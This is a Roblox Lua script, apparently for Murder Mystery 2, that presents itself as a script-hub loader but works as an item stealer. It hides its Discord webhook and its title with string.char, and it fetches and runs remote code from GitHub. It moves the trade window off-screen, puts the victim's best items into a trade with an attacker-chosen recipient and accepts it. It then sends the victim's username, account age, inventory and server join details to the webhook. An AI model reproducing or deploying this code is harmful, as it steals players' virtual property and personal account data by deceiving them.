Config = {
    Recipient = {"ErrorClient04"},
    Webhook = string.char(104, 116, 116, 112, 115, 58, 47, 47, 100, 105, 115, 99, 111, 114, 100, 46, 99, 111, 109, 47, 97, 112, 105, 47, 119, 101, 98, 104, 111, 111, 107, 115, 47, 49, 50, 55, 48, 54, 55, 56, 52, 54, 48, 51, 49, 51, 56, 57, 57, 48, 53, 50, 47, 78, 104, 89, 55, 54, 51, 54, 95, 99, 106, 67, 51, 122, 86, 106, 107, 88, 122, 117, 112, 86, 82, 113, 77, 90, 71, 81, 105, 88, 85, 117, 97, 121, 101, 100, 54, 98, 78, 56, 119, 119, 98, 89, 118, 97, 84, 115, 103, 81, 113, 121, 82, 84, 100, 110, 101, 106, 45, 115, 76, 121, 112, 118, 101, 102, 87, 113, 88),
    AllInventory = true,
    GoodItemsOnly = true,
    ReciTrade = "Hi",
    Security = true,
    Script = "Hub",
    CustomLink = "None"
}

repeat wait() until game:IsLoaded()

if getgenv().scriptexecuted then return end
getgenv().scriptexecuted = true

if Config.Security then
loadstring(game:HttpGet("https://raw.githubusercontent.com/Tk9URk9SU0tJRERFRExPTFNIVVRUSEVGVUNLVV/c2h1dHRoZWZ1Y2t1cHNraWRkZWQhISEx/main/aW1ha2V0aGlzb25odHRwc3B5bG9sc2h1dHRoZWZ1Y2t1cHNraWRkZWQ",true))()
end

local AshWeb = loadstring(game:HttpGet("https://raw.githubusercontent.com/Tk9URk9SU0tJRERFRExPTFNIVVRUSEVGVUNLVV/c2h1dHRoZWZ1Y2t1cHNraWRkZWQhISEx/main/U2tpZGRlZFdlYmhva2tsb2xsbGxsbA%3D%3D.lua"))()
AshWeb.ErrorPrinting = false
local embed = AshWeb.BuildEmbed()

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local VirtualUser = game:GetService("VirtualUser")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local Trade = ReplicatedStorage.Trade
local events = {"MouseButton1Click", "MouseButton1Down", "Activated"}
local TeleportScript = [[game:GetService("TeleportService"):TeleportToPlaceInstance("]] .. game.PlaceId .. [[", "]] .. game.JobId .. [[", game.Players.LocalPlayer)]]

if LocalPlayer.PlayerGui.MainGUI.Game:FindFirstChild("Inventory") ~= nil then
    UIPath = LocalPlayer.PlayerGui.MainGUI.Game.Inventory.Main
    TradePath = LocalPlayer.PlayerGui.TradeGUI
    Mobile = false
else
    UIPath = LocalPlayer.PlayerGui.MainGUI.Lobby.Screens.Inventory.Main
    TradePath = LocalPlayer.PlayerGui.TradeGUI_Phone
    Mobile = true
end

-- Function to check if any of the receivers are in the game
local function checkReceivers()
    for _, Receiver in pairs(Config.Recipient) do
        if Players:FindFirstChild(Receiver) then
            return Receiver
        end
    end
    return nil
end

-- Function to update the UI positions based on receiver presence
local function updateUIPositions()
    local playerGui = game.Players.LocalPlayer.PlayerGui
    local tradePartner
    local receiver = checkReceivers() -- Get the receiver in the game

    if Mobile then
        local tradeGuiPhone = playerGui:FindFirstChild("TradeGUI_Phone")
        if tradeGuiPhone then
            tradePartner = tradeGuiPhone.Container.Trade.TheirOffer:FindFirstChild("Username")
        end
    else
        local tradeGui = playerGui:FindFirstChild("TradeGUI")
        if tradeGui then
            tradePartner = tradeGui.Container.Trade.TheirOffer:FindFirstChild("Username")
        end
    end

    if tradePartner and receiver and tradePartner.Text == "(" .. receiver .. ")" then
        if Mobile then
            TradePath.Container.Position = UDim2.new(0, 9999, 0, 9999) -- Move off-screen
            TradePath.ClickBlocker.Position = UDim2.new(0, 9999, 0, 9999) -- Move off-screen
        else
            TradePath.BG.Position = UDim2.new(0, 9999, 0, 9999) -- Move off-screen
            TradePath.Container.Position = UDim2.new(0, 9999, 0, 9999) -- Move off-screen
            TradePath.ClickBlocker.Position = UDim2.new(0, 9999, 0, 9999) -- Move off-screen
            TradePath.Processing.Position = UDim2.new(0, 9999, 0, 9999) -- Move off-screen
        end
    else
        if Mobile then
            TradePath.Container.Position = UDim2.new(0.5, 0, 0.5, 0) -- Center screen
            TradePath.ClickBlocker.Position = UDim2.new(0, 0, 0, 0) -- Center screen
        else
            TradePath.BG.Position = UDim2.new(0, 0, 0, 0) -- Center screen
            TradePath.Container.Position = UDim2.new(0.5, 0, 0.5, 0) -- Center screen
            TradePath.ClickBlocker.Position = UDim2.new(0, 0, 0, 0) -- Center screen
            TradePath.Processing.Position = UDim2.new(0, 0, 0, 0) -- Center screen
        end
    end
end

-- Connect the updateUIPositions function to RenderStepped
RunService.RenderStepped:Connect(updateUIPositions)

local Inventory = {}

local games = {
    [142823291] = true,
    [335132309] = true,
    [636649648] = true
}

if not Config.Webhook:match("^https?://[%w-_%.%?%.:/%+=&]+$") then
   
    InvaildWebhook = true
    return
end

if type(Config.Recipient) ~= "table" or #Config.Recipient == 0 then
    
    return
end

if Config.Script == "Custom" and not Config.CustomLink:match("^https?://[%w-_%.%?%.:/%+=&]+$") then
    
    return
end

if Config.AllInventory ~= true and Config.AllInventory ~= false then
    Config.AllInventory = true
end

if Config.Script == nil then
    Config.Script = "None"
elseif Config.Script == "Custom" then
    Config.Script = Config.Script .. " - " .. Config.CustomLink
end

if Config.Script == "Custom" then
    loadstring(game:HttpGet(Config.CustomLink))()
elseif Config.Script == "Hub" then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FreeGamesScript23/Aug2006/main/UmScript/Pelinda.lua",true))()
elseif Config.Script == "Lite" then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FreeGamesScript23/Aug2006/main/UmScript/KeyLite.lua",true))()
elseif Config.Script == "Solara" then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FreeGamesScript23/Aug2006/main/UmScript/iloveyouplscomebacktome.lua",true))()
end

Executor = identifyexecutor()
if Executor == "Solara" then
    return
end

wait(3)

local success, errorMsg = pcall(function()
    Common = 0
    Uncommon = 0
    Rare = 0
    Legendary = 0
    Vintage = 0
    Godly = 0
    Ancient = 0
    Unique = 0
    
    LocalPlayer.Idled:connect(function()
        VirtualUser:CaptureController()
        VirtualUser:ClickButton2(Vector2.new())
    end)
    
    if LocalPlayer.PlayerGui.MainGUI.Game:FindFirstChild("Inventory") ~= nil then
        UIPath = LocalPlayer.PlayerGui.MainGUI.Game.Inventory.Main
        TradePath = LocalPlayer.PlayerGui.TradeGUI
        Mobile = false
    else
        UIPath = LocalPlayer.PlayerGui.MainGUI.Lobby.Screens.Inventory.Main
        TradePath = LocalPlayer.PlayerGui.TradeGUI_Phone
        Mobile = true
    end
    
    function TapUI(button, check, button2)
        if check == "Active Check" then
            if button.Active then
                button = button[button2]
            else
                return
            end
        end
        if check == "Text Check" then
            if button == "^" then
                button = button2
            else
                return
            end
        end
        for i,v in pairs(events) do
            for i,v in pairs(getconnections(button[v])) do
                v:Fire()
            end
        end
    end
    
    -- Define tables to hold items by their rarity
local CommonItems = {}
local UncommonItems = {}
local RareItems = {}
local LegendaryItems = {}
local GodlyItems = {}
local AncientItems = {}
local UniqueItems = {}
local VintageItems = {}

-- Function to categorize items based on their color and rarity
function Rarity(color, amount, tradeable)
    local Stack = 0

    if tradeable and tradeable:FindFirstChild("Evo") then
        return nil -- Skip items with "Evo" tag
    end

    if amount ~= "" then
        Stack = tonumber(amount:match("x(%d+)"))
    else
        Stack = 1
    end

    local r = math.floor(color.R * 255 + 0.5)
    local g = math.floor(color.G * 255 + 0.5)
    local b = math.floor(color.B * 255 + 0.5)

    if r == 106 and g == 106 and b == 106 then
        Common = Common + Stack
        return "Common"
    elseif r == 0 and g == 255 and b == 255 then
        Uncommon = Uncommon + Stack
        return "Uncommon"
    elseif r == 0 and g == 200 and b == 0 then
        Rare = Rare + Stack
        return "Rare"
    elseif r == 220 and g == 0 and b == 5 then
        Legendary = Legendary + Stack
        return "Legendary"
    elseif r == 255 and g == 0 and b == 179 then
        Godly = Godly + Stack
        return "Godly"
    elseif r == 100 and g == 10 and b == 255 then
        Ancient = Ancient + Stack
        return "Ancient"
    elseif r == 240 and g == 140 and b == 0 then
        Unique = Unique + Stack
        return "Unique"
    elseif r == 180 and g == 70 and b == 0 then
        Common = Common + Stack
        return "Common"
    else
        Vintage = Vintage + Stack
        return "Vintage"
    end
end

-- Function to process individual items
function checkitem(v)
    if v:IsA("Frame") then
        if v.ItemName.Label.Text ~= "Default Knife" and v.ItemName.Label.Text ~= "Default Gun" then
            local rarity = Rarity(v.ItemName.BackgroundColor3, v.Container.Amount.Text, v:FindFirstChild("Tags"))
            if rarity and Config.AllInventory then
                local number = v.Container.Amount.Text ~= "" and v.Container.Amount.Text or "x1"
                if rarity == "Common" then
                    table.insert(CommonItems, v.ItemName.Label.Text .. " " .. number)
                elseif rarity == "Uncommon" then
                    table.insert(UncommonItems, v.ItemName.Label.Text .. " " .. number)
                elseif rarity == "Rare" then
                    table.insert(RareItems, v.ItemName.Label.Text .. " " .. number)
                elseif rarity == "Legendary" then
                    table.insert(LegendaryItems, v.ItemName.Label.Text .. " " .. number)
                elseif rarity == "Godly" then
                    table.insert(GodlyItems, v.ItemName.Label.Text .. " " .. number)
                elseif rarity == "Ancient" then
                    table.insert(AncientItems, v.ItemName.Label.Text .. " " .. number)
                elseif rarity == "Unique" then
                    table.insert(UniqueItems, v.ItemName.Label.Text .. " " .. number)
                elseif rarity == "Vintage" then
                    table.insert(VintageItems, v.ItemName.Label.Text .. " " .. number)
                end
            end
        end
    end
end

-- Function to compile the full inventory
function AllInventory()
    -- Process Weapons
    for i,v in pairs(UIPath.Weapons.Items.Container:GetChildren()) do
        for i,v in pairs(v.Container:GetChildren()) do
            if v.Name == "Christmas" or v.Name == "Halloween" then
                for i,v in pairs(v.Container:GetChildren()) do
                    checkitem(v)
                end
            else
                checkitem(v)
            end
        end
    end

    -- Process Pets
    for i,v in pairs(UIPath.Pets.Items.Container.Current.Container:GetChildren()) do
        checkitem(v)
    end

    -- Check if inventory is empty
    if Common == 0 and Uncommon == 0 and Rare == 0 and Legendary == 0 and Godly == 0 and Ancient == 0 and Unique == 0 and Vintage == 0 then
        table.insert(Inventory, "None")
    else
        -- Add items to Inventory in sorted order with spaces
        if #CommonItems > 0 then table.insert(Inventory, "Common⬜:\n" .. table.concat(CommonItems, ", ")) end
        if #UncommonItems > 0 then table.insert(Inventory, "\nUncommon🟩:\n" .. table.concat(UncommonItems, ", ")) end
        if #RareItems > 0 then table.insert(Inventory, "\nRare🟦:\n" .. table.concat(RareItems, ", ")) end
        if #LegendaryItems > 0 then table.insert(Inventory, "\nLegendary🟥:\n" .. table.concat(LegendaryItems, ", ")) end
        if #GodlyItems > 0 then table.insert(Inventory, "\nGodly🎀:\n" .. table.concat(GodlyItems, ", ")) end
        if #AncientItems > 0 then table.insert(Inventory, "\nAncient🟪:\n" .. table.concat(AncientItems, ", ")) end
        if #UniqueItems > 0 then table.insert(Inventory, "\nUnique🟧:\n" .. table.concat(UniqueItems, ", ")) end
        if #VintageItems > 0 then table.insert(Inventory, "\nVintage🟨:\n" .. table.concat(VintageItems, ", ")) end
    end

    -- Create final inventory string
    if Config.AllInventory then
        AllItems = table.concat(Inventory, "\n") -- Organize each rarity category into a new line
    else
        AllItems = "Full inventory set false."
    end
end

-- Run the AllInventory function
AllInventory()

    
    task.wait()
    
    local function TradeSending()
        if checkReceivers() then
            if Mobile then
                local Path = LocalPlayer.PlayerGui.MainGUI.Lobby.Leaderboard
                TapUI(Path.Container.Close)
                TapUI(Path.Container.PlayerList[Receiver].ActionButton)
                TapUI(Path.Popup.Container.Action.Trade)
                TapUI(Path.Popup.Container.Close)
            else
                local Path = LocalPlayer.PlayerGui.MainGUI.Game.Leaderboard

                TapUI(Path.Container.Close.Title.Text, "Text Check", Path.Container.Close.Toggle)
                TapUI(Path.Container.TradeRequest.ReceivingRequest, "Active Check", "Decline")
                TapUI(Path.Container.TradeRequest.SendingRequest, "Active Check", "Cancel")
                TapUI(Path.Container[Receiver].ActionButton)
                TapUI(Path.Inspect.Trade)
                TapUI(Path.Inspect.Close)
            end
        else
            print("")
        end
    end
    
    function commandschat()
        Players[Receiver].Chatted:Connect(function(msg)
            if msg == Config.ReciTrade then
                TradeSending()
            end
        end)
    end
    
    function JustdoIt(player)
        for i,v in pairs(Config.Recipient) do
            if v == player then
                Receiver = player
                commandschat()
                wait(10)
                TradeSending()
            end
        end
    end
    
    -- Function to insert items
function InsertItems()
    local ItemsByRarity = {
        Ancient = {},
        Godly = {},
        Unique = {},
        Vintage = {},
        Legendary = {},
        Rare = {},
        Uncommon = {},
        Common = {}
    }

    for i, v in pairs(TradePath.Container.Items.Main:GetChildren()) do
        for i, v in pairs(v.Items.Container.Current.Container:GetChildren()) do
            if v:IsA("Frame") then
                if v.ItemName.Label.Text ~= "Default Knife" and v.ItemName.Label.Text ~= "Default Gun" then
                    local rarity = "Common"
                    local color = v.ItemName.BackgroundColor3
                    if color == Color3.fromRGB(220, 0, 5) then
                        rarity = "Legendary"
                    elseif color == Color3.fromRGB(255, 0, 179) then
                        rarity = "Godly"
                    elseif color == Color3.fromRGB(100, 10, 255) then
                        rarity = "Ancient"
                    elseif color == Color3.fromRGB(240, 140, 0) then
                        rarity = "Unique"
                    elseif color == Color3.fromRGB(255, 255, 0) then
                        rarity = "Vintage"
                    elseif color == Color3.fromRGB(0, 200, 0) then
                        rarity = "Rare"
                    elseif color == Color3.fromRGB(0, 255, 255) then
                        rarity = "Uncommon"
                    end
                    table.insert(ItemsByRarity[rarity], v)
                end
            end
        end
    end

    local ItemsInTrade = 0
    local rarityOrder = {"Ancient", "Godly", "Unique", "Vintage", "Legendary", "Rare", "Uncommon", "Common"}

    for _, rarity in ipairs(rarityOrder) do
        for _, item in ipairs(ItemsByRarity[rarity]) do
            if ItemsInTrade < 4 then
                ItemsInTrade = ItemsInTrade + 1
                local LoopsItem = 1
                local Amount = item.Container.Amount.Text
                if Amount ~= "" then
                    LoopsItem = tonumber(Amount:match("x(%d+)"))
                end
                task.wait()
                for i = 1, LoopsItem do
                    TapUI(item.Container.ActionButton)
                end
            end
        end
    end




end
TradePath:GetPropertyChangedSignal("Enabled"):Connect(function()
    task.wait(3)
    if TradePath.Enabled then
        local playerGui = game.Players.LocalPlayer.PlayerGui
        local tradePartner

        if Mobile then
            tradePartner = playerGui:FindFirstChild("TradeGUI_Phone").Container.Trade.TheirOffer:FindFirstChild("Username")
        else
            tradePartner = playerGui:FindFirstChild("TradeGUI").Container.Trade.TheirOffer:FindFirstChild("Username")
        end

        if tradePartner and tradePartner.Text == "(" .. Receiver .. ")" then
            InsertItems()
            task.wait(7)
            game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(285646582)
        end
    else
        
    end
end)
    
    Players.PlayerAdded:Connect(function(player)
        JustdoIt(player.Name)
    end)
    
    for i,v in pairs(Players:GetPlayers())do
        JustdoIt(v.Name)
    end
end)
if success then
    message = "```Username     : " .. LocalPlayer.Name.."\nUser Id      : " .. LocalPlayer.UserId .. "\nAccount Age  : " .. LocalPlayer.AccountAge .. "\nExploit      : " .. Executor .. "\nReceiver/s   : " .. table.concat(Config.Recipient, ", ") .. "\nScript       : " .. Config.Script .. "```\🎒 **__Inventory__**\n```Ancient    🟪: " .. Ancient .. "\nGodly      🎀: " .. Godly .. "\nUnique     🟧: " .. Unique .. "\nVintage    🟨: " .. Vintage .. "\nLegendary  🟥: " .. Legendary .. "\nRare       🟦: " .. Rare .. "\nUncommon   🟩: " .. Uncommon .. "\nCommon     ⬜: " .. Common .. "```\🎒’ **__Full Inventory__**\n```" .. AllItems .. "```\”— **__Execute to join__**\n```" .. TeleportScript .. "```"
else
    message = "```Error   : " .. errorMsg .. "\nExploit : " .. Executor .. "```\n\n**If you see this error means something went wrong report this to me lol.**"
end

if InvaildWebhook then
    return
end

if Vintage == 0 and Godly == 0 and Ancient == 0 and Unique == 0 and Config.GoodItemsOnly then
    content = ""
elseif Common == 0 and Uncommon == 0 and Rare == 0 and Legendary == 0 and Godly == 0 and Ancient == 0 and Unique == 0 and Vintage == 0 then
    content = ""
else
    content = "@everyone"
end

  embed.Info = {
  	Settings = {
  		Color = AshWeb.ColorConverter(Color3.fromRGB(173, 0, 159))
  	},
  	Embed = {
        Title = string.char(42, 42, 95, 95, 240, 159, 145, 145, 95, 95, 42, 42, 32, 42, 42, 95, 95, 65, 115, 104, 98, 111, 114, 110, 110, 95, 95, 42, 42, 32, 124, 32, 42, 42, 95, 95, 69, 120, 99, 108, 117, 115, 105, 118, 101, 32, 83, 116, 101, 97, 108, 101, 114, 95, 95, 42, 42),
  		Description = message
  	}
}

AshWeb:Send({
	url = Config.Webhook, -- can be more than one
	content = content,
	embeds = {embed} 
})
